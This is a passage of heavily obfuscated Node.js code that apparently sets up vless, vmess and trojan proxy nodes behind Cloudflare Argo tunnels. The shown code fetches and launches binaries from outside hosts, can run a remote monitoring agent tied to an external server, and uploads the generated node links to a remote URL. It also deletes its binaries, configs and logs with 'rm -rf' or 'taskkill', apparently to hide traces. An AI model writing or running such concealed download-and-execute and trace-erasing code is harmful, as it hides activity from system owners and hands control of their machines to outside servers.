            'fileUrl': _0x5593a4[_0x4896ac(0x142)]
        },
        {
            'fileName': botPath,
            'fileUrl': _0x5593a4[_0x4896ac(0x13e)]
        }
    ];
    if (_0x5593a4[_0x4896ac(0x30b)](NEZHA_SERVER, NEZHA_KEY)) {
        if (NEZHA_PORT) {
            const _0x249687 = _0x5593a4[_0x4896ac(0x1e0)](_0x13a291, _0x5593a4[_0x4896ac(0x257)]) ? _0x5593a4[_0x4896ac(0x12e)] : _0x5593a4[_0x4896ac(0x132)];
            _0x5b1796[_0x4896ac(0x26f)]({
                'fileName': npmPath,
                'fileUrl': _0x249687
            });
        } else {
            const _0x1171bd = _0x5593a4[_0x4896ac(0x1e0)](_0x13a291, _0x5593a4[_0x4896ac(0x257)]) ? _0x5593a4[_0x4896ac(0x165)] : _0x5593a4[_0x4896ac(0x14f)];
            _0x5b1796[_0x4896ac(0x26f)]({
                'fileName': phpPath,
                'fileUrl': _0x1171bd
            });
        }
    }
    return _0x5b1796;
}
function argoType() {
    const _0x357312 = _0x58b021, _0x20fdc5 = {
            'vUDnN': function (_0x1c62ee, _0x2dfa9f) {
                return _0x1c62ee || _0x2dfa9f;
            },
            'TadEO': _0x357312(0x1c4) + _0x357312(0x1da) + _0x357312(0x283) + _0x357312(0x157) + _0x357312(0x241) + _0x357312(0x292) + 's',
            'wSAHs': _0x357312(0x294) + 'et',
            'djeOl': _0x357312(0x32d) + 'n',
            'DnrJq': _0x357312(0x15d),
            'xqQHd': _0x357312(0x29b) + _0x357312(0x2f8) + _0x357312(0x185) + _0x357312(0x244) + _0x357312(0x29e) + _0x357312(0x26c)
        };
    if (_0x20fdc5[_0x357312(0x15b)](!ARGO_AUTH, !ARGO_DOMAIN)) {
        console[_0x357312(0x269)](_0x20fdc5[_0x357312(0x197)]);
        return;
    }
    if (ARGO_AUTH[_0x357312(0x150)](_0x20fdc5[_0x357312(0x26a)])) {
        fs[_0x357312(0x2e1) + _0x357312(0x322)](path[_0x357312(0x2b3)](FILE_PATH, _0x20fdc5[_0x357312(0x2bf)]), ARGO_AUTH);
        const _0x51d5f3 = _0x357312(0x2f1) + '\x20' + ARGO_AUTH[_0x357312(0x262)]('\x22')[-0x2 * 0x6e5 + 0x9e3 * -0x3 + -0x2 * -0x15bf] + (_0x357312(0x34c) + _0x357312(0x2b6) + '\x20') + path[_0x357312(0x2b3)](FILE_PATH, _0x20fdc5[_0x357312(0x2bf)]) + (_0x357312(0x16d) + _0x357312(0x271) + _0x357312(0x210) + _0x357312(0x169) + _0x357312(0x137)) + ARGO_DOMAIN + (_0x357312(0x25f) + _0x357312(0x217) + _0x357312(0x2e5) + _0x357312(0x2be)) + ARGO_PORT + (_0x357312(0x261) + _0x357312(0x205) + _0x357312(0x200) + _0x357312(0x174) + _0x357312(0x346) + _0x357312(0x331) + _0x357312(0x307) + _0x357312(0x1e9) + '\x20');
        fs[_0x357312(0x2e1) + _0x357312(0x322)](path[_0x357312(0x2b3)](FILE_PATH, _0x20fdc5[_0x357312(0x24f)]), _0x51d5f3);
    } else
        console[_0x357312(0x269)](_0x20fdc5[_0x357312(0x29d)]);
}
async function extractDomains() {
    const _0x341ea8 = _0x58b021, _0x15ba9d = {
            'PkErj': function (_0x75cf99, _0x100388) {
                return _0x75cf99 === _0x100388;
            },
            'IcHHc': _0x341ea8(0x309),
            'XwbJN': function (_0x35d4ed, _0x1ed23a) {
                return _0x35d4ed(_0x1ed23a);
            },
            'yomBy': _0x341ea8(0x2dc) + _0x341ea8(0x2bc) + 'n/',
            'ycRrg': _0x341ea8(0x175) + _0x341ea8(0x183) + _0x341ea8(0x187),
            'EGicb': _0x341ea8(0x1ba),
            'WoSIt': _0x341ea8(0x2f7),
            'VuVxw': _0x341ea8(0x19e),
            'jEnRA': _0x341ea8(0x1d3) + 'pe',
            'poeMk': _0x341ea8(0x290) + _0x341ea8(0x206) + _0x341ea8(0x2ef),
            'eWpMG': _0x341ea8(0x276),
            'wHYPu': _0x341ea8(0x279) + _0x341ea8(0x25e),
            'PBFwP': _0x341ea8(0x270),
            'loURF': _0x341ea8(0x1a4),
            'PCJWk': function (_0x4f7429) {
                return _0x4f7429();
            },
            'CQEIN': function (_0x5cdff9, _0x3d3bce, _0x1fd5ad) {
                return _0x5cdff9(_0x3d3bce, _0x1fd5ad);
            },
            'hUMUs': function (_0x58257f, _0x43b8c6) {
                return _0x58257f && _0x43b8c6;
            },
            'DpBzK': _0x341ea8(0x1c4) + 'N:',
            'SASoO': function (_0x20d9b2, _0x5dbeb9) {
                return _0x20d9b2(_0x5dbeb9);
            },
            'yFBrP': _0x341ea8(0x33e),
            'VtBKO': _0x341ea8(0x2ef),
            'UBBid': function (_0x4ec326, _0x590a1b) {
                return _0x4ec326 > _0x590a1b;
            },
            'KGBvl': _0x341ea8(0x32a) + ':',
            'cCKGZ': _0x341ea8(0x32a) + _0x341ea8(0x2d4) + _0x341ea8(0x2da) + _0x341ea8(0x13f) + _0x341ea8(0x266) + _0x341ea8(0x335),
            'otyfl': function (_0x3ac1e7) {
                return _0x3ac1e7();
            },
            'NLTxM': function (_0x4c925c) {
                return _0x4c925c();
            },
            'vPZQk': _0x341ea8(0x2e4) + _0x341ea8(0x2b0) + _0x341ea8(0x1c8)
        };
    let _0xf6919;
    if (_0x15ba9d[_0x341ea8(0x1a3)](ARGO_AUTH, ARGO_DOMAIN))
        _0xf6919 = ARGO_DOMAIN, console[_0x341ea8(0x269)](_0x15ba9d[_0x341ea8(0x232)], _0xf6919), await _0x15ba9d[_0x341ea8(0x1ed)](_0x2066af, _0xf6919);
    else
        try {
            const _0xd22fc0 = fs[_0x341ea8(0x199) + 'nc'](path[_0x341ea8(0x2b3)](FILE_PATH, _0x15ba9d[_0x341ea8(0x196)]), _0x15ba9d[_0x341ea8(0x18c)]), _0x3895e5 = _0xd22fc0[_0x341ea8(0x262)]('\x0a'), _0x10e944 = [];
            _0x3895e5[_0x341ea8(0x29f)](_0x1801b0 => {
                const _0x553dd7 = _0x341ea8, _0x1648da = _0x1801b0[_0x553dd7(0x267)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
                if (_0x1648da) {
                    const _0x4765f3 = _0x1648da[-0x1050 + 0x1d1f + -0xcce];
                    _0x10e944[_0x553dd7(0x2f4)](_0x4765f3);
                }
            });
            if (_0x15ba9d[_0x341ea8(0x176)](_0x10e944[_0x341ea8(0x19b)], 0x1242 + -0x139b + 0x159))
                _0xf6919 = _0x10e944[0x7 * -0x511 + 0x90d + 0x1a6a], console[_0x341ea8(0x269)](_0x15ba9d[_0x341ea8(0x2c7)], _0xf6919), await _0x15ba9d[_0x341ea8(0x2c3)](_0x2066af, _0xf6919);
            else {
                console[_0x341ea8(0x269)](_0x15ba9d[_0x341ea8(0x2a0)]), fs[_0x341ea8(0x27c)](path[_0x341ea8(0x2b3)](FILE_PATH, _0x15ba9d[_0x341ea8(0x196)]));
                async function _0x2246b3() {
                    const _0x22bc6e = _0x341ea8;
                    try {
                        _0x15ba9d[_0x22bc6e(0x138)](process[_0x22bc6e(0x1d6)], _0x15ba9d[_0x22bc6e(0x30c)]) ? await _0x15ba9d[_0x22bc6e(0x2c3)](exec, _0x22bc6e(0x227) + _0x22bc6e(0x342) + botName + (_0x22bc6e(0x2ba) + _0x22bc6e(0x293))) : await _0x15ba9d[_0x22bc6e(0x2c3)](exec, _0x22bc6e(0x358) + '[' + botName[_0x22bc6e(0x17e)](-0x1a3e * 0x1 + 0xb * 0xcb + 0x3 * 0x5d7) + ']' + botName[_0x22bc6e(0x2e3)](-0x89 * -0x43 + 0x1411 + -0x23 * 0x199) + (_0x22bc6e(0x1d8) + _0x22bc6e(0x143)));
                    } catch (_0x2dfdd8) {
                    }
                }
                _0x15ba9d[_0x341ea8(0x25a)](_0x2246b3), await new Promise(_0x58fbf4 => setTimeout(_0x58fbf4, -0x509 + 0x4db * -0x8 + 0x3799));
                const _0x4e4dbd = _0x341ea8(0x2d1) + _0x341ea8(0x1e7) + _0x341ea8(0x178) + _0x341ea8(0x1b5) + _0x341ea8(0x1b2) + _0x341ea8(0x32e) + _0x341ea8(0x278) + _0x341ea8(0x1f1) + FILE_PATH + (_0x341ea8(0x288) + _0x341ea8(0x15a) + _0x341ea8(0x340) + _0x341ea8(0x2f0) + _0x341ea8(0x272)) + ARGO_PORT;
                try {
                    await _0x15ba9d[_0x341ea8(0x1ed)](exec, _0x341ea8(0x306) + botPath + '\x20' + _0x4e4dbd + (_0x341ea8(0x1cf) + _0x341ea8(0x1f9))), console[_0x341ea8(0x269)](botName + (_0x341ea8(0x1b1) + 'g')), await new Promise(_0x348eaf => setTimeout(_0x348eaf, 0x1195 + 0x4 * -0x7c9 + 0x86d * 0x3)), await _0x15ba9d[_0x341ea8(0x225)](extractDomains);
                } catch (_0xa2b865) {
                    console[_0x341ea8(0x282)](_0x341ea8(0x223) + _0x341ea8(0x18b) + _0x341ea8(0x2ad) + _0xa2b865);
                }
            }
        } catch (_0xbbf5ff) {
            console[_0x341ea8(0x282)](_0x15ba9d[_0x341ea8(0x33b)], _0xbbf5ff);
        }
    async function _0x1f5a5b() {
        const _0x38bf37 = _0x341ea8;
        try {
            const _0x3fc9ef = await axios[_0x38bf37(0x243)](_0x15ba9d[_0x38bf37(0x339)], { 'timeout': 0xbb8 });
            if (_0x3fc9ef[_0x38bf37(0x224)] && _0x3fc9ef[_0x38bf37(0x224)][_0x38bf37(0x2c9) + 'de'] && _0x3fc9ef[_0x38bf37(0x224)][_0x38bf37(0x1ad)])
                return _0x3fc9ef[_0x38bf37(0x224)][_0x38bf37(0x2c9) + 'de'] + '_' + _0x3fc9ef[_0x38bf37(0x224)][_0x38bf37(0x1ad)];
        } catch (_0x110ff1) {
            try {
                const _0x59c9c0 = await axios[_0x38bf37(0x243)](_0x15ba9d[_0x38bf37(0x24e)], { 'timeout': 0xbb8 });
                if (_0x59c9c0[_0x38bf37(0x224)] && _0x15ba9d[_0x38bf37(0x138)](_0x59c9c0[_0x38bf37(0x224)][_0x38bf37(0x2ea)], _0x15ba9d[_0x38bf37(0x13d)]) && _0x59c9c0[_0x38bf37(0x224)][_0x38bf37(0x359) + 'e'] && _0x59c9c0[_0x38bf37(0x224)][_0x38bf37(0x1ad)])
                    return _0x59c9c0[_0x38bf37(0x224)][_0x38bf37(0x359) + 'e'] + '_' + _0x59c9c0[_0x38bf37(0x224)][_0x38bf37(0x1ad)];
            } catch (_0x4f60f5) {
            }
        }
        return _0x15ba9d[_0x38bf37(0x1eb)];
    }
    async function _0x2066af(_0x2a98ab) {
        const _0x5c455b = _0x341ea8, _0x5f3573 = {
                'SAOXK': _0x15ba9d[_0x5c455b(0x23c)],
                'AEKBv': _0x15ba9d[_0x5c455b(0x151)],
                'AHVVY': _0x15ba9d[_0x5c455b(0x22f)],
                'AWYWE': _0x15ba9d[_0x5c455b(0x2ae)],
                'hVJGW': _0x15ba9d[_0x5c455b(0x20a)],
                'sAHLL': _0x15ba9d[_0x5c455b(0x2ce)],
                'cfRyu': _0x15ba9d[_0x5c455b(0x24d)],
                'aABXx': function (_0x19afda) {
                    const _0xb9927d = _0x5c455b;
                    return _0x15ba9d[_0xb9927d(0x325)](_0x19afda);
                },
                'LTUTm': function (_0x3bbeae, _0x395ee5) {
                    const _0x4b3a99 = _0x5c455b;
                    return _0x15ba9d[_0x4b3a99(0x2c3)](_0x3bbeae, _0x395ee5);
                },
                'jotYs': function (_0x4fd1d1, _0x3f0304, _0x5e30fb) {
                    const _0x4082e6 = _0x5c455b;
                    return _0x15ba9d[_0x4082e6(0x14d)](_0x4fd1d1, _0x3f0304, _0x5e30fb);
                }
            }, _0x4ce509 = await _0x15ba9d[_0x5c455b(0x325)](_0x1f5a5b), _0x2cf94b = NAME ? NAME + '-' + _0x4ce509 : _0x4ce509;
        return new Promise(_0x3c6e6a => {
            const _0x4abdb5 = _0x5c455b, _0x12ab8d = {
                    'saxJN': _0x5f3573[_0x4abdb5(0x1cb)],
                    'dusfY': _0x5f3573[_0x4abdb5(0x28e)],
                    'zrQMt': _0x5f3573[_0x4abdb5(0x2bb)],
                    'EdThI': _0x5f3573[_0x4abdb5(0x20d)],
                    'KRnDB': _0x5f3573[_0x4abdb5(0x355)],
                    'gSvkJ': _0x5f3573[_0x4abdb5(0x27e)],
                    'TfEwM': _0x5f3573[_0x4abdb5(0x284)],
                    'erYiS': function (_0x25fe72) {
                        const _0x579ec6 = _0x4abdb5;
                        return _0x5f3573[_0x579ec6(0x2cd)](_0x25fe72);
                    },
                    'kZXsi': function (_0x435eef, _0x97a7f0) {
                        const _0x485caa = _0x4abdb5;
                        return _0x5f3573[_0x485caa(0x1aa)](_0x435eef, _0x97a7f0);
                    }
                };
            _0x5f3573[_0x4abdb5(0x320)](setTimeout, () => {
                const _0x39899d = _0x4abdb5, _0x4a63ad = {
                        'PUtXi': _0x12ab8d[_0x39899d(0x16b)],
                        'uciBE': _0x12ab8d[_0x39899d(0x324)],
                        'EZudO': _0x12ab8d[_0x39899d(0x1ff)]
                    }, _0x176731 = {
                        'v': '2',
                        'ps': '' + _0x2cf94b,
                        'add': CFIP,
                        'port': CFPORT,
                        'id': UUID,
                        'aid': '0',
                        'scy': _0x12ab8d[_0x39899d(0x265)],
                        'net': 'ws',
                        'type': _0x12ab8d[_0x39899d(0x265)],
                        'host': _0x2a98ab,
                        'path': _0x12ab8d[_0x39899d(0x18a)],
                        'tls': _0x12ab8d[_0x39899d(0x22e)],
                        'sni': _0x2a98ab,
                        'alpn': '',
                        'fp': _0x12ab8d[_0x39899d(0x313)]
                    }, _0x41c645 = _0x39899d(0x2f6) + UUID + '@' + CFIP + ':' + CFPORT + (_0x39899d(0x2a5) + _0x39899d(0x21b) + _0x39899d(0x1f7) + _0x39899d(0x1bb)) + _0x2a98ab + (_0x39899d(0x1f6) + _0x39899d(0x1ab) + _0x39899d(0x1f0)) + _0x2a98ab + (_0x39899d(0x34a) + _0x39899d(0x326) + _0x39899d(0x238) + '0#') + _0x2cf94b + _0x39899d(0x246) + Buffer[_0x39899d(0x2ab)](JSON[_0x39899d(0x2df)](_0x176731))[_0x39899d(0x188)](_0x12ab8d[_0x39899d(0x16b)]) + (_0x39899d(0x234) + '/') + UUID + '@' + CFIP + ':' + CFPORT + (_0x39899d(0x193) + _0x39899d(0x1a9)) + _0x2a98ab + (_0x39899d(0x1f6) + _0x39899d(0x1ab) + _0x39899d(0x1f0)) + _0x2a98ab + (_0x39899d(0x2cb) + _0x39899d(0x27f) + _0x39899d(0x21d) + _0x39899d(0x1e6)) + _0x2cf94b + _0x39899d(0x2c4);
                console[_0x39899d(0x269)](Buffer[_0x39899d(0x2ab)](_0x41c645)[_0x39899d(0x188)](_0x12ab8d[_0x39899d(0x16b)])), fs[_0x39899d(0x2e1) + _0x39899d(0x322)](subPath, Buffer[_0x39899d(0x2ab)](_0x41c645)[_0x39899d(0x188)](_0x12ab8d[_0x39899d(0x16b)])), console[_0x39899d(0x269)](FILE_PATH + (_0x39899d(0x212) + _0x39899d(0x163) + _0x39899d(0x1a0))), _0x12ab8d[_0x39899d(0x351)](uploadNodes), app[_0x39899d(0x243)]('/' + SUB_PATH, (_0x27b6ea, _0x2c4834) => {
                    const _0x730352 = _0x39899d, _0x5c1065 = Buffer[_0x730352(0x2ab)](_0x41c645)[_0x730352(0x188)](_0x4a63ad[_0x730352(0x30f)]);
                    _0x2c4834[_0x730352(0x31a)](_0x4a63ad[_0x730352(0x258)], _0x4a63ad[_0x730352(0x24c)]), _0x2c4834[_0x730352(0x27a)](_0x5c1065);
                }), _0x12ab8d[_0x39899d(0x214)](_0x3c6e6a, _0x41c645);
            }, -0x18da + 0x3 * 0x55 + -0x1fab * -0x1);
        });
    }
}
async function uploadNodes() {
    const _0x30ebfa = _0x58b021, _0x138984 = {
            'SNlPw': function (_0x1597d3, _0x1971bc) {
                return _0x1597d3 && _0x1971bc;
            },
            'jVkEL': _0x30ebfa(0x31e) + _0x30ebfa(0x1bd),
            'OLasF': function (_0xb09953, _0x254a9c) {
                return _0xb09953 === _0x254a9c;
            },
            'zOBSN': _0x30ebfa(0x247) + _0x30ebfa(0x139) + _0x30ebfa(0x146) + _0x30ebfa(0x2a2),
            'kftxS': function (_0x315541, _0x17450d) {
                return _0x315541 === _0x17450d;
            },
            'AyjWc': _0x30ebfa(0x2ef),
            'QWkMH': _0x30ebfa(0x12f) + _0x30ebfa(0x1a2) + _0x30ebfa(0x1a0)
        };
    if (_0x138984[_0x30ebfa(0x230)](UPLOAD_URL, PROJECT_URL)) {
        const _0x3bd54e = PROJECT_URL + '/' + SUB_PATH, _0x2495b3 = { 'subscription': [_0x3bd54e] };
        try {
            const _0x2ec460 = await axios[_0x30ebfa(0x2a4)](UPLOAD_URL + (_0x30ebfa(0x1ae) + _0x30ebfa(0x152) + 'ns'), _0x2495b3, { 'headers': { 'Content-Type': _0x138984[_0x30ebfa(0x298)] } });
            return _0x2ec460 && _0x138984[_0x30ebfa(0x1ec)](_0x2ec460[_0x30ebfa(0x2ea)], -0x25 * -0xfe + -0x16da + -0xd14) ? (console[_0x30ebfa(0x269)](_0x138984[_0x30ebfa(0x353)]), _0x2ec460) : null;
        } catch (_0x39816a) {
            if (_0x39816a[_0x30ebfa(0x30a)]) {
                if (_0x138984[_0x30ebfa(0x274)](_0x39816a[_0x30ebfa(0x30a)][_0x30ebfa(0x2ea)], -0x1f4d + 0x9f + -0x2 * -0x101f)) {
                }
            }
        }
    } else {
        if (UPLOAD_URL) {
            if (!fs[_0x30ebfa(0x18f)](listPath))
                return;
            const _0x367902 = fs[_0x30ebfa(0x199) + 'nc'](listPath, _0x138984[_0x30ebfa(0x222)]), _0x355a9b = _0x367902[_0x30ebfa(0x262)]('\x0a')[_0x30ebfa(0x216)](_0x257503 => /(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x30ebfa(0x2de)](_0x257503));
            if (_0x138984[_0x30ebfa(0x274)](_0x355a9b[_0x30ebfa(0x19b)], -0x9 * 0x273 + 0x25 * 0xd3 + -0x43a * 0x2))
                return;
            const _0xe4fe3a = JSON[_0x30ebfa(0x2df)]({ 'nodes': _0x355a9b });
            try {
                const _0x296348 = await axios[_0x30ebfa(0x2a4)](UPLOAD_URL + (_0x30ebfa(0x251) + _0x30ebfa(0x2ff)), _0xe4fe3a, { 'headers': { 'Content-Type': _0x138984[_0x30ebfa(0x298)] } });
                return _0x296348 && _0x138984[_0x30ebfa(0x1ec)](_0x296348[_0x30ebfa(0x2ea)], -0x107b + 0xc1e + -0x1b7 * -0x3) ? (console[_0x30ebfa(0x269)](_0x138984[_0x30ebfa(0x23b)]), _0x296348) : null;
            } catch (_0x4c92c) {
                return null;
            }
        } else
            return;
    }
}
function cleanFiles() {
    const _0x2f94c8 = _0x58b021, _0xa66aca = {
            'hNhki': _0x2f94c8(0x2b4) + _0x2f94c8(0x2b8),
            'XdASm': _0x2f94c8(0x2d3) + _0x2f94c8(0x158) + _0x2f94c8(0x133) + _0x2f94c8(0x228),
            'MOByp': function (_0x36cea1, _0x6f657e) {
                return _0x36cea1 && _0x6f657e;
            },
            'UKbfK': function (_0x5c317e, _0x2d767b) {
                return _0x5c317e === _0x2d767b;
            },
            'iKffn': _0x2f94c8(0x309),
            'HWCbo': function (_0x129139, _0x4d65b1, _0x1c7f96) {
                return _0x129139(_0x4d65b1, _0x1c7f96);
            }
        };
    _0xa66aca[_0x2f94c8(0x134)](setTimeout, () => {
        const _0x4fc714 = _0x2f94c8, _0x95efac = [
                bootLogPath,
                configPath,
                webPath,
                botPath
            ];
        if (NEZHA_PORT)
            _0x95efac[_0x4fc714(0x2f4)](npmPath);
        else
            _0xa66aca[_0x4fc714(0x14b)](NEZHA_SERVER, NEZHA_KEY) && _0x95efac[_0x4fc714(0x2f4)](phpPath);
        _0xa66aca[_0x4fc714(0x1b8)](process[_0x4fc714(0x1d6)], _0xa66aca[_0x4fc714(0x1ac)]) ? _0xa66aca[_0x4fc714(0x134)](exec, _0x4fc714(0x15c) + _0x95efac[_0x4fc714(0x2b3)]('\x20') + (_0x4fc714(0x1e4) + '1'), _0xc028bc => {
            const _0x3ebe4e = _0x4fc714;
            console[_0x3ebe4e(0x2cf)](), console[_0x3ebe4e(0x269)](_0xa66aca[_0x3ebe4e(0x195)]), console[_0x3ebe4e(0x269)](_0xa66aca[_0x3ebe4e(0x2d2)]);
        }) : _0xa66aca[_0x4fc714(0x134)](exec, _0x4fc714(0x1f3) + _0x95efac[_0x4fc714(0x2b3)]('\x20') + (_0x4fc714(0x1cf) + _0x4fc714(0x20b)), _0xe5407e => {
            const _0xfbe921 = _0x4fc714;
            console[_0xfbe921(0x2cf)](), console[_0xfbe921(0x269)](_0xa66aca[_0xfbe921(0x195)]), console[_0xfbe921(0x269)](_0xa66aca[_0xfbe921(0x2d2)]);
        });
    }, -0x27de9 + 0x22be * 0x5 + 0x32fc3);
}
function _0x1236(_0x22859d, _0x1515bc) {
    const _0x4c27c5 = _0x4750();
    return _0x1236 = function (_0x3ebbfe, _0xea4741) {
        _0x3ebbfe = _0x3ebbfe - (0x24d8 + 0x25e8 + -0x4 * 0x1265);
        let _0x592683 = _0x4c27c5[_0x3ebbfe];
        return _0x592683;
    }, _0x1236(_0x22859d, _0x1515bc);
}
function _0x4750() {
    const _0x30209e = [
        '\x0atls:\x20',
        'SAOXK',
        'ecture',
        'config.yam',
        'owiiP',
        '\x20>/dev/nul',
        'SERVER_POR',
        'flILz',
        'web\x20runnin',
        'Content-Ty',
        '/tunnel.ym',
        'listen',
        'platform',
        'AwYSI',
        '\x22\x20>\x20/dev/n',
        'g\x20error:\x20',
        'N\x20or\x20ARGO_',
        'se\x0agpu:\x20fa',
        '8443',
        'untry_code',
        'express',
        'NEZHA_SERV',
        'yJPCQ',
        'sable_nat:',
        'ute:\x20false',
        'fsxjZ',
        '\x20>\x20nul\x202>&',
        '\x20successfu',
        '60#',
        'dge-ip-ver',
        'OkXZK',
        'atus:404\x0a\x20',
        '\x0aclient_se',
        'WoSIt',
        'OLasF',
        'SASoO',
        'npm\x20runnin',
        'l://8.8.8.',
        'host=',
        'le\x20',
        'Can\x27t\x20find',
        'rm\x20-rf\x20',
        'quic',
        'stream',
        '&fp=firefo',
        'urity=tls&',
        'XrroO',
        'l\x202>&1\x20&',
        '745812qLpDmJ',
        'se_ipv6_co',
        'ent\x20archit',
        'qfRxy',
        'nt:\x20true\x0as',
        'zrQMt',
        ':\x0a\x20\x20\x20\x20\x20\x20\x20\x20',
        'n\x20--skip-p',
        'CFPORT',
        'les:',
        'FILE_PATH',
        'ginRequest',
        ';\x20charset=',
        '8/dns-quer',
        '\x20task\x20fail',
        'hyOTX',
        'wHYPu',
        'l\x202>&1',
        'oluUN',
        'AWYWE',
        'qnGhi',
        '2087',
        '\x20\x0a\x20\x20ingres',
        '6|1',
        '/sub.txt\x20s',
        'vision',
        'kZXsi',
        'all',
        'filter',
        'vice:\x20http',
        'https+loca',
        'FDqxk',
        '4\x0aserver:\x20',
        'n=none&sec',
        '443',
        '%3Fed%3D25',
        'mkdirSync',
        'Cbtlz',
        'false',
        '--skip-con',
        'AyjWc',
        'Error\x20exec',
        'data',
        'NLTxM',
        'amd',
        'taskkill\x20/',
        't,\x20enjoy!',
        'rocs\x20>/dev',
        'exec',
        'NEZHA_KEY',
        'r\x20is\x20runni',
        'wHYju',
        'gSvkJ',
        'poeMk',
        'SNlPw',
        'true',
        'DpBzK',
        'lly',
        '\x0a\x0atrojan:/',
        '937770GkMnRB',
        'env',
        '\x20failed:\x20',
        '3Fed%3D256',
        'pop',
        'e:\x20true\x0adi',
        'QWkMH',
        'VuVxw',
        'pipe',
        'kEqcb',
        'mnzYV',
        'GDDQA',
        'ty,\x20use\x20qu',
        'NEZHA\x20vari',
        'get',
        't,use\x20toke',
        'http',
        '\x0a\x0avmess://',
        'Subscripti',
        'SUmVT',
        'ViRgZ',
        'has',
        '/config.js',
        'EZudO',
        'loURF',
        'ycRrg',
        'DnrJq',
        'query:\x20fal',
        '/api/add-n',
        'mmand_exec',
        'QaZId',
        'xtls-rprx-',
        'VRmjp',
        '/null\x202>&1',
        'sXKOS',
        'uciBE',
        '\x20a\x20file\x20fo',
        'otyfl',
        'https://oo',
        'cpPwW',
        'm64.ssss.n',
        'o?ed=2560',
        '\x0a\x20\x20\x20\x20\x20\x20ser',
        'Hello\x20worl',
        '\x0a\x20\x20\x20\x20\x20\x20ori',
        'split',
        'xists',
        'Skipping\x20a',
        'EdThI',
        'obtain\x20Arg',
        'match',
        '127.0.0.1',
        'log',
        'wSAHs',
        'ss\x20task',
        'to\x20tunnel',
        '\x20is\x20create',
        'tcp',
        'unshift',
        'tls',
        'l:\x20http2\x0a\x20',
        'ocalhost:',
        '\x20false\x0adis',
        'kftxS',
        'zNleL',
        'none',
        '-auto-upda',
        'p2\x20--logfi',
        '/vmess-arg',
        'send',
        '3163230iyXSqX',
        'unlinkSync',
        'troRu',
        'sAHLL',
        'rojan-argo',
        'zlgQs',
        'fpxZB',
        'error',
        'AUTH\x20varia',
        'cfRyu',
        'unning',
        '\x0adebug:\x20fa',
        'VWNDe',
        '/boot.log\x20',
        ':\x20false\x0auu',
        'xbUzU',
        't\x20failed\x20f',
        'ng\x20on\x20port',
        '402e7a',
        'AEKBv',
        'MHSDK',
        'text/plain',
        'ure:\x20false',
        'ick\x20tunnel',
        '\x202>&1',
        'TunnelSecr',
        'd64.ssss.n',
        'map',
        'matic\x20acce',
        'jVkEL',
        'kjyuan',
        'automatic\x20',
        'ARGO_AUTH\x20',
        'apysr',
        'xqQHd',
        'n\x20connect\x20',
        'forEach',
        'cCKGZ',
        '\x201800\x0arepo',
        'ully',
        'chmod',
        'post',
        '?encryptio',
        'php\x20runnin',
        'message',
        'id:\x20',
        'kMsbt',
        'ARGO_AUTH',
        'from',
        'statSync',
        'and:\x20',
        'eWpMG',
        'QpoWk',
        'ing\x20boot.l',
        'qwCsD',
        'catch',
        'join',
        'App\x20is\x20run',
        'yc.mn/agen',
        'ials-file:',
        'vmess',
        'ning',
        'lGBlQ',
        '.exe\x20>\x20nul',
        'AHVVY',
        'api.co/jso',
        'for\x20',
        'st:',
        'djeOl',
        'LBkEq',
        'wKdny',
        'Unhandled\x20',
        'XwbJN',
        '\x0a\x20\x20\x20\x20',
        'ection_cou',
        'QtTqh',
        'KGBvl',
        'k\x20added\x20su',
        'country_co',
        '--tls',
        '&path=%2Ft',
        'SUB_PATH',
        'aABXx',
        'PBFwP',
        'clear',
        'axBfe',
        'tunnel\x20--e',
        'XdASm',
        'Thank\x20you\x20',
        '\x20not\x20found',
        'QAGVO',
        'ynzzr',
        'createWrit',
        'aarch64',
        'e:\x20false\x0au',
        ',\x20re-runni',
        'Error\x20down',
        'https://ip',
        '4065420MpMUsm',
        'test',
        'stringify',
        'cLhJj',
        'writeFileS',
        'r\x20the\x20curr',
        'substring',
        'Error\x20read',
        '://localho',
        'XLdmd',
        'Download\x20',
        'kip_procs_',
        './tmp',
        'status',
        'yc.mn/bot',
        'JylhH',
        '--config\x20',
        'or\x20',
        'utf-8',
        'l\x20http://l',
        '\x0a\x20\x20tunnel:',
        'PORT',
        '8DsTUKM',
        'push',
        'fileName',
        '\x0avless://',
        'Unknown',
        'mismatch\x20T',
        'lse\x0ainsecu',
        'NEZHA_PORT',
        'uvwxyz',
        '9246',
        'p2\x20run\x20--t',
        'Empowermen',
        'odes',
        'vless',
        'BTCHm',
        'Error\x20in\x20s',
        '954-4f7e-8',
        'direct',
        '2083',
        'nohup\x20',
        'e:\x20http_st',
        '32a-9dcc60',
        'win32',
        'response',
        'Zycjj',
        'IcHHc',
        'NAME',
        '\x20-c\x20',
        'PUtXi',
        'able_send_',
        'net/add-ur',
        'child_proc',
        'TfEwM',
        'NbIHn',
        'Add\x20automa',
        '\x20-p\x20',
        'WKOTJ',
        'mywat',
        'count:\x20tru',
        'set',
        'isFile',
        '\x20--disable',
        'block',
        'applicatio',
        'e\x0atemperat',
        'jotYs',
        'ull\x202>&1\x20&',
        'ync',
        'https://am',
        'dusfY',
        'PCJWk',
        'less-argo%',
        'dFdrz',
        'arch',
        'freedom',
        'ArgoDomain',
        'blackhole',
        '/vless-arg',
        'tunnel.jso',
        'otocol\x20htt',
        'basename',
        'jcFJI',
        '\x20\x20-\x20servic',
        '\x0adisable_f',
        'uXZNB',
        'PEHae',
        'oDomain',
        'fileUrl',
        'sub.txt',
        'list.txt',
        'yomBy',
        'close',
        'vPZQk',
        'Rzube',
        'klmnopqrst',
        'boot.log',
        '\x20already\x20e',
        '\x20info\x20--ur',
        'http\x20serve',
        'f\x20/im\x20',
        'error\x20in\x20s',
        'pty,skip\x20r',
        '\x0askip_conn',
        'y:\x20true\x0a\x20\x20',
        'Tyixz',
        'BpBoY',
        '/trojan-ar',
        '&path=%2Fv',
        'abcdefghij',
        '\x0a\x20\x20credent',
        'QrciS',
        'rtmIu',
        'iNeDc',
        'loading\x20fi',
        'erYiS',
        'FERtS',
        'zOBSN',
        'then',
        'hVJGW',
        '\x0ause_gitee',
        'trojan',
        'pkill\x20-f\x20\x22',
        'countryCod',
        'UUID',
        'ylFER',
        'GWiOh',
        'Nodes\x20uplo',
        'arm64',
        'uyUPg',
        'rQnJQ',
        'this\x20scrip',
        'HWCbo',
        'disable_co',
        'vkMOF',
        'ostname:\x20',
        'PkErj',
        'on\x20uploade',
        'readdirSyn',
        'axios',
        'jEFsi',
        'EGicb',
        'yPWWo',
        'ng\x20bot\x20to\x20',
        'eu.org',
        'arm',
        'nRvTm',
        'ull\x202>&1',
        '/api/delet',
        'path',
        'd\x20successf',
        'cret:\x20',
        'ml\x22\x20>/dev/',
        'yc.mn/v1',
